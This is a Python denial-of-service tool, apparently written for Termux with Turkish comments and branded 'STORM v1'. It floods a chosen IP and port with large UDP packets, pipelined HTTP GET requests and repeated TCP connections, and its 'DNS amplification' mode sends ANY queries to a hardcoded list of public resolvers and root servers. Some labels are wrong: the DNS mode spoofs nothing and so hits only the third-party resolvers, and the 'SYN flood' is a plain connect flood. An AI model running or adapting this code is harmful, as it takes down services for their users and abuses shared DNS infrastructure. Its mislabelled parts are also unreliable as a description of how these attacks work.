#!/data/data/com.termux/files/usr/bin/python
import socket
import threading
import random
import time
import os
import struct
import sys

os.system("clear")
print("\033[91m")
print("╔══════════════════════════════════════════════════════════════════╗")
print("║              STORM v1 - Multi-Vector Attack Engine               ║")
print("║        Developer: linuxsquad | No Proxy Needed                   ║")
print("╚══════════════════════════════════════════════════════════════════╝")
print("\033[0m")

if len(sys.argv) < 3:
    print("Kullanim: python storm.py <HEDEF> <PORT> [THREADS] [SORE] [MOD]")
    print("MOD: udp | http | dns | all")
    print("Ornek  : python storm.py 1.1.1.1 80 2000 60 all")
    sys.exit(1)

HEDEF = sys.argv[1]
PORT = int(sys.argv[2])
THREADS = int(sys.argv[3]) if len(sys.argv) > 3 else 2000
SURE = int(sys.argv[4]) if len(sys.argv) > 4 else 0
MOD = sys.argv[5].lower() if len(sys.argv) > 5 else "all"

stats = {"gonderilen": 0, "bayt": 0, "hata": 0, "baslama": time.time()}
lock = threading.Lock()

def guncelle(pkt=0, bayt=0, hata=0):
    with lock:
        stats["gonderilen"] += pkt
        stats["bayt"] += bayt
        stats["hata"] += hata

def istatistik():
    while True:
        time.sleep(3)
        gecen = time.time() - stats["baslama"]
        if gecen < 1: continue
        mbps = (stats["bayt"] * 8) / (gecen * 1_000_000)
        pps = stats["gonderilen"] / gecen
        print(f"\033[94m[+]{mbps:.0f} Mbps | {pps:.0f} PPS | Error:{stats['hata']}\033[0m", end=" \r")

# ==================== DNS AMPLIFICATION (EN ÖNEMLİSİ) ====================
# ANY sorgusu için kullanılacak domainler
DOMAINS = ["google.com", "facebook.com", "cloudflare.com", "apple.com", 
           "microsoft.com", "amazon.com", "netflix.com", "youtube.com",
           "instagram.com", "linkedin.com", "github.com", "whatsapp.com",
           "tiktok.com", "snapchat.com", "spotify.com", "twitter.com"]

# Açık DNS resolver'lar (gerçek çalışanlar)
RESOLVERS = [
    "8.8.8.8", "8.8.4.4", "1.1.1.1", "1.0.0.1",
    "9.9.9.9", "208.67.222.222", "208.67.220.220",
    "185.228.168.9", "185.228.169.9", "76.76.19.19",
    "64.6.64.6", "64.6.65.6", "208.67.222.220",
    "208.67.220.222", "198.41.0.4", "199.9.14.201",
    "192.33.4.12", "199.7.91.13", "192.203.230.10",
    "192.5.6.30", "192.36.148.17", "192.26.92.30",
    "192.31.80.30", "192.42.93.30", "193.0.14.129"
]

def dns_sorgu(domain, tip=255):
    """ANY tipi DNS sorgusu paketi - ~40 bayt"""
    tid = random.randint(0, 0xFFFF)
    header = struct.pack('>HHHHHH', tid, 0x0100, 1, 0, 0, 0)
    
    qname = b''
    for p in domain.split('.'):
        qname += bytes([len(p)]) + p.encode()
    qname += b'\x00'
    
    return header + qname + struct.pack('>HH', tip, 1)

def dns_worker():
    """DNS Amplification: 40 bayt sorgu -> 3000+ bayt yanit"""
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**24)
    
    while True:
        try:
            resolver = random.choice(RESOLVERS)
            domain = random.choice(DOMAINS)
            sorgu = dns_sorgu(domain, 255)
            
            # ÇÖZÜM: Aynı anda 10 farklı resolver'a sorgu at
            for _ in range(5):
                sock.sendto(sorgu, (random.choice(RESOLVERS), 53))
                guncelle(pkt=1, bayt=len(sorgu))
        except:
            guncelle(hata=1)

# ==================== HTTP FLOOD (YÜKSEK PERFORMANS) ====================
def http_worker():
    """HTTP/1.1 flood - keep-alive + pipeline"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(5)
        sock.connect((HEDEF, PORT))
    except:
        return
    
    while True:
        try:
            # 10 tane isteği tek seferde pişir (HTTP pipelining)
            istk = ""
            for _ in range(10):
                istk += f"GET /?{random.randint(1,999999)} HTTP/1.1\r\n"
                istk += f"Host: {HEDEF}\r\n"
                istk += "User-Agent: Mozilla/5.0\r\n"
                istk += "Accept: */*\r\n"
                istk += "Connection: keep-alive\r\n\r\n"
            
            sock.send(istk.encode())
            
            # Her istek ~500 bayt
            toplam_bayt = len(istk)
            guncelle(pkt=10, bayt=toplam_bayt)
            
            # Yanıtı bekleme, hemen sonraki istek
        except:
            try:
                sock.close()
            except:
                pass
            guncelle(hata=10)
            time.sleep(0.1)
            # Yeniden bağlan
            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                sock.settimeout(5)
                sock.connect((HEDEF, PORT))
            except:
                pass

# ==================== UDP FLOOD (MAX BOYUT) ====================
def udp_worker():
    """UDP flood - maximum paket boyutu"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 2**25)
    except:
        return
    
    while True:
        try:
            # Max UDP boyutu: 65507 bayt
            boyut = random.randint(50000, 65507)
            yuk = os.urandom(boyut)
            
            sock.sendto(yuk, (HEDEF, PORT))
            guncelle(pkt=1, bayt=boyut)
        except:
            guncelle(hata=1)

# ==================== SYN FLOOD (BAĞLANTI YİYEN) ====================
def syn_worker():
    """SYN flood - portu sürekli bağlantıyla boğ"""
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(0.1)
            s.connect((HEDEF, PORT))
            s.send(b"GET / HTTP/1.1\r\n\r\n")
            s.close()
            guncelle(pkt=1, bayt=100)
        except:
            guncelle(hata=1)

# ==================== ANA ÇALIŞTIRMA ====================
print(f"\033[92m[+] Hedef: {HEDEF}:{PORT}")
print(f"[+] Thread: {THREADS} | Mod: {MOD.upper()}")
print(f"[+] DNS Resolver: {len(RESOLVERS)} adet\033[0m\n")

# İstatistik thread'ini başlat
threading.Thread(target=istatistik, daemon=True).start()

if MOD in ["udp", "all"]:
    print(f"\033[93m[+] UDP flood baslatiliyor...\033[0m")
    for _ in range(THREADS // 4):
        threading.Thread(target=udp_worker, daemon=True).start()

if MOD in ["http", "all"]:
    print(f"\033[93m[+] HTTP pipeline baslatiliyor...\033[0m")
    for _ in range(THREADS // 4):
        threading.Thread(target=http_worker, daemon=True).start()

if MOD in ["dns", "all"]:
    print(f"\033[93m[+] DNS amplification baslatiliyor...\033[0m")
    for _ in range(THREADS // 2):  # DNS en etkili, en çok thread'i ona ver
        threading.Thread(target=dns_worker, daemon=True).start()

if MOD == "all":
    print(f"\033[93m[+] SYN flood baslatiliyor...\033[0m")
    for _ in range(THREADS // 4):
        threading.Thread(target=syn_worker, daemon=True).start()

# Süre kontrolü
try:
    if SURE > 0:
        print(f"\n\033[91m[!] {SURE} saniye calisacak...\033[0m")
        time.sleep(SURE)
    else:
        while True:
            time.sleep(10)
except KeyboardInterrupt:
    print("\n\033[91m[-] Durduruldu\033[0m")
finally:
    gecen = time.time() - stats["baslama"]
    print(f"\n\033[92m[+] Tamamlandi: {gecen:.0f} sn | Ortalama: {(stats['bayt']*8)/(gecen*1_000_000):.0f} Mbps\033[0m")
